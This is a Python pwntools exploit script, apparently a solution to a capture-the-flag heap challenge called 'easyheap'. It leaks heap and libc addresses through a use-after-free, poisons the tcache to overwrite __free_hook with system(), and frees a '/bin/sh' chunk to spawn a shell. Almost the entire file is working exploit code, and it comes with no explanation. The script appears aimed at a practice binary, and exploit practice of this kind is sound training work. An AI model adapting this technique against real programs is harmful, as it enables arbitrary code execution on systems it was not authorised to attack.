from pwn import *
import sys
import time

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

script = """
b 146
c
c
c
c
c
c
c
c
c
c
c
c
c
"""

if len(sys.argv) > 1:
    p = gdb.debug("./easyheap", gdbscript=script, level="debug")
else:
    p = process("./easyheap")

def add(index, nlen, name, price=10):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: ", str(index))
    p.sendlineafter(b"Length of name: ", str(nlen))
    p.sendlineafter(b"Name: ", name)
    p.sendlineafter(b"Price: ", str(price))
    log.info(f"Added {name} with length {hex(nlen)}, price {price} at index {index}")

def delete(index):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Which book do you want to delete: ", str(index))
    log.info(f"Deleted index {index}")

def edit(index, name, price=10):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Which book do you want to edit: ", str(index))
    p.sendlineafter(b"Name: ", name)
    p.sendlineafter(b"Price: ", str(price))
    log.info(f"Edited index {index} to name {name} with price {price}")

def list_books():
    p.sendlineafter(b"> ", b"4")
    log.info(f"List books")

def get_name(index):
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"Index: ", str(index))
    log.info(f"Get name of index {index}")

# leak heap
add(0, 0x10, "dummy")
delete(0)
list_books()
p.recvuntil(b"Index:\t")
heap = int(p.recvline()[:-1]) - 0x10
log.info(f"Heap: {hex(heap)}")

# leak libc
add(1, 0x10, "dummy")
add(2, 0x10, "dummy")
add(3, 0x410, "dummy")
add(4, 0x410, "dummy")
delete(1)
delete(2)
add(5, 0x20, p64(heap+0x370))
delete(3)
get_name(1)
p.recvuntil(b"Name: ")
libc = u64(p.recv(6).ljust(8, b'\x00')) - 0x1ecbe0
_system = libc + 0x522c0
__free_hook = libc + 0x1eee48
log.info(f"Libc: {hex(libc)}")
log.info(f"_system: {hex(_system)}")
log.info(f"__free_hook: {hex(__free_hook)}")

# tcache poisoning
edit(5, p64(heap+0x790))
delete(1)

edit(5, p64(__free_hook-8))

add(6, 0x20, b'/bin/sh\x00' + p64(_system))
delete(6)

p.interactive()

# *name(fd) | index(bk)
# price     | namelen